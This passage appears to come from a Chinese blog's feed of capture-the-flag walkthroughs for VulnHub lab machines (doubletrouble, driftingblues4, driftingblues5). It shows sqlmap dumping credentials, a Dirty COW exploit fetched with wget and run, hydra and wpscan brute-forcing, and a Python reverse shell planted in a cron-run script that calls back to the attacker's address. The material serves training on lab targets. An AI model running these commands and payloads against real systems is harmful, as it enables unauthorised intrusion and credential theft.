class="line">[11:58:01] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.6.170'</span><br><span class="line">[11:58:01] [WARNING] your sqlmap version is outdated</span><br><span class="line"></span><br><span class="line">sqlmap -r 1.txt -D "doubletrouble" --tables --batch</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">users</span><br><span class="line">Database: doubletrouble</span><br><span class="line">[1 table]</span><br><span class="line">+-------+</span><br><span class="line">| users |</span><br><span class="line">+-------+</span><br><span class="line"></span><br><span class="line">[12:00:01] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.6.170'</span><br><span class="line">[12:00:01] [WARNING] your sqlmap version is outdated</span><br><span class="line"></span><br><span class="line">[*] ending @ 12:00:01 /2023-03-20/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -r 1.txt -D "doubletrouble" -T "users" --batch --dump</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Database: doubletrouble</span><br><span class="line">Table: users</span><br><span class="line">[2 entries]</span><br><span class="line">+----------+----------+</span><br><span class="line">| password | username |</span><br><span class="line">+----------+----------+</span><br><span class="line">| afsZxc1  | montreux |</span><br><span class="line">| ZubZub99 | clapton  |</span><br><span class="line">+----------+----------+</span><br></pre></td></tr></table></figure>

<ul>
<li>发现无法登录</li>
</ul>
<h3 id="SSH进入后台-inner"><a href="#SSH进入后台-inner" class="headerlink" title="SSH进入后台(inner)"></a>SSH进入后台(inner)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> failed</span></span><br><span class="line">ssh montreux@192.168.6.170</span><br><span class="line">afsZxc1</span><br><span class="line"><span class="meta">#</span><span class="bash"> ok</span></span><br><span class="line">ssh clapton@192.168.6.170</span><br><span class="line">ZubZub99</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">clapton@doubletrouble:~$ id</span><br><span class="line">uid=1000(clapton) gid=1000(clapton) groups=1000(clapton)</span><br></pre></td></tr></table></figure>

<h3 id="提权-inner"><a href="#提权-inner" class="headerlink" title="提权(inner)"></a>提权(inner)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">clapton@doubletrouble:~$ uname -a</span><br><span class="line">Linux doubletrouble 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>

<ul>
<li>脏牛</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget --no-check-certificate https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c</span><br><span class="line"></span><br><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line"></span><br><span class="line">./dirty</span><br><span class="line"></span><br><span class="line">ssh firefart@192.168.6.170</span><br></pre></td></tr></table></figure>

<p><img data-src="./doubletrouble1/8.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>doubletrouble</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>doubletrouble</tag>
      </tags>
  </entry>
  <entry>
    <title>driftingblues4</title>
    <url>/2021/05/23/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/driftingblues4/</url>
    <content><![CDATA[<h1 id="driftingblues4"><a href="#driftingblues4" class="headerlink" title="driftingblues4"></a>driftingblues4</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>driftingblues4</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues4]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:0e:9a:51, IPv4: 192.168.43.189</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1	82:46:1b:4c:ff:3f	(Unknown: locally administered)</span><br><span class="line">192.168.43.133	08:00:27:e2:38:3c	PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.188	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.019 seconds (126.80 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.133</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.43.133</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues4]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.43.133</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-23 05:38 EDT</span><br><span class="line">Nmap scan report for 192.168.43.133</span><br><span class="line">Host is up (0.00067s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     ProFTPD</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)</span><br><span class="line">|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)</span><br><span class="line">|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">MAC Address: 08:00:27:E2:38:3C (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 15.13 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./driftingblues4/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.43.133/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues4]</span><br><span class="line">└─# gobuster dir -u http://192.168.43.133/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.43.133/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              php,html,txt</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/23 05:39:02 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 409]</span><br><span class="line">/server-status        (Status: 403) [Size: 279]</span><br><span class="line">                                               </span><br><span class="line">===============================================================</span><br><span class="line">2021/05/23 05:41:50 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./driftingblues4/2.png" alt></p>
<ul>
<li>右键源代码</li>
</ul>
<p><img data-src="./driftingblues4/3.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues4]</span><br><span class="line">└─# echo "Z28gYmFjayBpbnRydWRlciEhISBkR2xuYUhRZ2MyVmpkWEpwZEhrZ1pISnBjSEJwYmlCaFUwSnZZak5DYkVsSWJIWmtVMlI1V2xOQ2FHSnBRbXhpV0VKellqTnNiRnBUUWsxTmJYZ3dWMjAxVjJGdFJYbGlTRlpoVFdwR2IxZHJUVEZOUjFaSlZWUXdQUT09" | base64 -d</span><br><span class="line">go back intruder!!! dGlnaHQgc2VjdXJpdHkgZHJpcHBpbiBhU0JvYjNCbElIbHZkU2R5WlNCaGJpQmxiWEJzYjNsbFpTQk1NbXgwV201V2FtRXliSFZhTWpGb1drTTFNR1ZJVVQwPQ==                                                                                                                                                                                                                     </span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues4]</span><br><span class="line">└─# echo "dGlnaHQgc2VjdXJpdHkgZHJpcHBpbiBhU0JvYjNCbElIbHZkU2R5WlNCaGJpQmxiWEJzYjNsbFpTQk1NbXgwV201V2FtRXliSFZhTWpGb1drTTFNR1ZJVVQwPQ==" | base64 -d</span><br><span class="line">tight security drippin aSBob3BlIHlvdSdyZSBhbiBlbXBsb3llZSBMMmx0Wm5WamEybHVaMjFoWkM1MGVIUT0=                                                                                                                                                                                                                     </span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues4]</span><br><span class="line">└─# echo "aSBob3BlIHlvdSdyZSBhbiBlbXBsb3llZSBMMmx0Wm5WamEybHVaMjFoWkM1MGVIUT0=" | base64 -d                                                        </span><br><span class="line">i hope you're an employee L2ltZnVja2luZ21hZC50eHQ=                                                                                                                                                                                                                     </span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues4]</span><br><span class="line">└─# echo "L2ltZnVja2luZ21hZC50eHQ=" | base64 -d                                            </span><br><span class="line">/imfuckingmad.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>发现密文文件</li>
</ul>
<p><img data-src="./driftingblues4/4.png" alt></p>
<h3 id="解密后"><a href="#解密后" class="headerlink" title="解密后"></a>解密后</h3><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">man we are a tech company and still getting hacked??? what the shit??? enough is enough!!! </span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#</span></span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"></span><br><span class="line">/iTiS3Cr3TbiTCh.png</span><br></pre></td></tr></table></figure>

<ul>
<li>发现二维码</li>
</ul>
<p><img data-src="./driftingblues4/5.png" alt></p>
<ul>
<li>扫描发现</li>
</ul>
<p><img data-src="./driftingblues4/6.png" alt></p>
<ul>
<li>发现敏感账号信息</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">luther</span><br><span class="line">gary</span><br><span class="line">hubert</span><br><span class="line">clark</span><br></pre></td></tr></table></figure>

<h3 id="hrdra"><a href="#hrdra" class="headerlink" title="hrdra"></a>hrdra</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra 192.168.43.133 ftp -l luther -P /usr/share/wordlists/rockyou.txt -e ns -vV</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[21][ftp] host: 192.168.43.133   login: luther   password: mypics</span><br></pre></td></tr></table></figure>

<ul>
<li><code>ftp</code>登录上传<code>ssh</code>相关认证文件</li>
</ul>
<p><img data-src="./driftingblues4/7.png" alt></p>
<ul>
<li>拿到<code>shell</code></li>
</ul>
<p><img data-src="./driftingblues4/8.png" alt></p>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><ul>
<li><code>pspy64</code>发现</li>
</ul>
<p><img data-src="./driftingblues4/9.png" alt></p>
<ul>
<li>代码文件</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># emergency.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">'echo 1 &gt;&gt; /tmp/backdoor_testing'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># template python script for backdoor purposes</span></span><br><span class="line"><span class="comment"># i'm gonna leave it with loose permissions</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># say africa without a's</span></span><br></pre></td></tr></table></figure>

<ul>
<li>删除代码文件</li>
</ul>
<p><img data-src="./driftingblues4/10.png" alt></p>
<ul>
<li>写入反弹<code>shell</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># new emergency.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># imports here</span></span><br><span class="line"><span class="keyword">import</span> socket,subprocess</span><br><span class="line">HOST = <span class="string">'192.168.43.189'</span></span><br><span class="line">PORT = <span class="number">7776</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((HOST, PORT))</span><br><span class="line">s.send(<span class="string">'[*] Connection Established!'</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">"quit"</span>: <span class="keyword">break</span></span><br><span class="line">    proc = subprocess.Popen(data, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line">    stdout_value = proc.stdout.read() + proc.stderr.read()</span><br><span class="line">    s.send(stdout_value)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<ul>
<li>最后拿到<code>root-shell</code></li>
</ul>
<p><img data-src="./driftingblues4/11.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>driftingblues</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>driftingblues5</title>
    <url>/2021/05/24/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/driftingblues5/</url>
    <content><![CDATA[<h1 id="driftingblues5"><a href="#driftingblues5" class="headerlink" title="driftingblues5"></a>driftingblues5</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>driftingblues5</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:0e:9a:51, IPv4: 192.168.43.189</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1	82:46:1b:4c:ff:3f	(Unknown: locally administered)</span><br><span class="line">192.168.43.3	08:00:27:70:d1:93	PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.188	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.942 seconds (131.82 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.3</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.43.3</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.43.3</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-24 08:15 EDT</span><br><span class="line">Nmap scan report for 192.168.43.3</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)</span><br><span class="line">|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)</span><br><span class="line">|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-generator: WordPress 5.6.2</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: diary &amp;#8211; Just another WordPress site</span><br><span class="line">MAC Address: 08:00:27:70:D1:93 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.36 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./driftingblues5/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.43.3/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# gobuster dir -u http://192.168.43.3/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.43.3/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/24 08:15:31 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.php            (Status: 301) [Size: 0] [--&gt; http://192.168.43.3/]</span><br><span class="line">/wp-content           (Status: 301) [Size: 317] [--&gt; http://192.168.43.3/wp-content/]</span><br><span class="line">/wp-login.php         (Status: 200) [Size: 6625]                                     </span><br><span class="line">/license.txt          (Status: 200) [Size: 19915]                                    </span><br><span class="line">/wp-includes          (Status: 301) [Size: 318] [--&gt; http://192.168.43.3/wp-includes/]</span><br><span class="line">/readme.html          (Status: 200) [Size: 7278]                                      </span><br><span class="line">/wp-trackback.php     (Status: 200) [Size: 135]                                       </span><br><span class="line">/wp-admin             (Status: 301) [Size: 315] [--&gt; http://192.168.43.3/wp-admin/]   </span><br><span class="line">/xmlrpc.php           (Status: 405) [Size: 42]                                        </span><br><span class="line">/wp-signup.php        (Status: 302) [Size: 0] [--&gt; http://192.168.43.3/wp-login.php?action=register]</span><br><span class="line">/server-status        (Status: 403) [Size: 277]                                                     </span><br><span class="line">                                                                                                    </span><br><span class="line">===============================================================</span><br><span class="line">2021/05/24 08:18:56 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./driftingblues5/2.png" alt></p>
<p>发现就是一个单纯的<code>wordpress</code></p>
<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.43.3/ --enumerate u</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] abuzerkomurcu</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://192.168.43.3/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] satanic</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] gill</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] collins</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] gadd</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Mon May 24 08:21:45 2021</span><br><span class="line">[+] Requests Done: 36</span><br><span class="line">[+] Cached Requests: 41</span><br><span class="line">[+] Data Sent: 9.851 KB</span><br><span class="line">[+] Data Received: 242.38 KB</span><br><span class="line">[+] Memory used: 157.457 MB</span><br><span class="line">[+] Elapsed time: 00:00:02</span><br></pre></td></tr></table></figure>

<ul>
<li><code>cewl</code>生成密码本</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cewl -d 3 -w password.txt http://192.168.43.3/</span><br></pre></td></tr></table></figure>

<ul>
<li>暴力破解</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> -U albert</span></span><br><span class="line">wpscan --url http://192.168.43.3/ -P ./password.txt </span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[+] Performing password attack on Wp Login against 5 user/s</span><br><span class="line">[SUCCESS] - gill / interchangeable                                                                                                                                                                                   </span><br><span class="line">Trying abuzerkomurcu / Author Time: 00:02:06 &lt;==========================================================================================================                        &gt; (7315 / 8825) 82.88%  ETA: ??:??:??</span><br><span class="line"></span><br><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: gill, Password: interchangeable</span><br></pre></td></tr></table></figure>

<p>获得账号密码 <code>gill / interchangeable</code></p>
<h3 id="登入web后台"><a href="#登入web后台" class="headerlink" title="登入web后台"></a>登入web后台</h3><ul>
<li>并未通过后台拿到<code>shell</code></li>
<li>查看后台，发现图片</li>
</ul>
<p><img data-src="./driftingblues5/3.png" alt></p>
<p><img data-src="./driftingblues5/4.png" alt></p>
<ul>
<li>发现图片隐藏信息</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exiftool dblogo.png  </span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">ExifTool Version Number         : 12.16</span><br><span class="line">File Name                       : dblogo.png</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 19 KiB</span><br><span class="line">File Modification Date/Time     : 2021:02:24 09:46:01-05:00</span><br><span class="line">File Access Date/Time           : 2021:05:25 04:36:48-04:00</span><br><span class="line">File Inode Change Date/Time     : 2021:05:25 04:36:48-04:00</span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : PNG</span><br><span class="line">File Type Extension             : png</span><br><span class="line">MIME Type                       : image/png</span><br><span class="line">Image Width                     : 300</span><br><span class="line">Image Height                    : 300</span><br><span class="line">Bit Depth                       : 8</span><br><span class="line">Color Type                      : RGB with Alpha</span><br><span class="line">Compression                     : Deflate/Inflate</span><br><span class="line">Filter                          : Adaptive</span><br><span class="line">Interlace                       : Noninterlaced</span><br><span class="line">SRGB Rendering                  : Perceptual</span><br><span class="line">Gamma                           : 2.2</span><br><span class="line">Pixels Per Unit X               : 2835</span><br><span class="line">Pixels Per Unit Y               : 2835</span><br><span class="line">Pixel Units                     : meters</span><br><span class="line">XMP Toolkit                     : Adobe XMP Core 5.6-c142 79.160924, 2017/07/13-01:06:39</span><br><span class="line">Creator Tool                    : Adobe Photoshop CC 2018 (Windows)</span><br><span class="line">Create Date                     : 2021:02:24 02:55:28+03:00</span><br><span class="line">Metadata Date                   : 2021:02:24 02:55:28+03:00</span><br><span class="line">Modify Date                     : 2021:02:24 02:55:28+03:00</span><br><span class="line">Instance ID                     : xmp.iid:562b80d4-fe12-8541-ae0c-6a21e7859405</span><br><span class="line">Document ID                     : adobe:docid:photoshop:7232d876-a1d0-044b-9604-08837143888b</span><br><span class="line">Original Document ID            : xmp.did:5890be6c-649b-0248-af9b-19889727200c</span><br><span class="line">Color Mode                      : RGB</span><br><span class="line">ICC Profile Name                : sRGB IEC61966-2.1</span><br><span class="line">Format                          : image/png</span><br><span class="line">History Action                  : created, saved</span><br><span class="line">History Instance ID             : xmp.iid:5890be6c-649b-0248-af9b-19889727200c, xmp.iid:562b80d4-fe12-8541-ae0c-6a21e7859405</span><br><span class="line">History When                    : 2021:02:24 02:55:28+03:00, 2021:02:24 02:55:28+03:00</span><br><span class="line">History Software Agent          : Adobe Photoshop CC 2018 (Windows), Adobe Photoshop CC 2018 (Windows)</span><br><span class="line">History Changed                 : /</span><br><span class="line">Text Layer Name                 : ssh password is 59583hello of course it is lowercase maybe not</span><br><span class="line">Text Layer Text                 : ssh password is 59583hello of course it is lowercase maybe not :)</span><br><span class="line">Document Ancestors              : adobe:docid:photoshop:871a8adf-5521-894c-8a18-2b27c91a893b</span><br><span class="line">Image Size                      : 300x300</span><br><span class="line">Megapixels                      : 0.090</span><br></pre></td></tr></table></figure>

<p>获得账号密码 <code>gill / 59583hello</code></p>
<p><img data-src="./driftingblues5/5.png" alt></p>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><ul>
<li><p>简直狗血</p>
</li>
<li><p>首先破解<code>kedx</code>文件，之后再根目录下的<code>keyfolder</code>下创建文件</p>
</li>
</ul>
<p><img data-src="./driftingblues5/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">touch /keyfolder/fracturedocean</span><br></pre></td></tr></table></figure>

<ul>
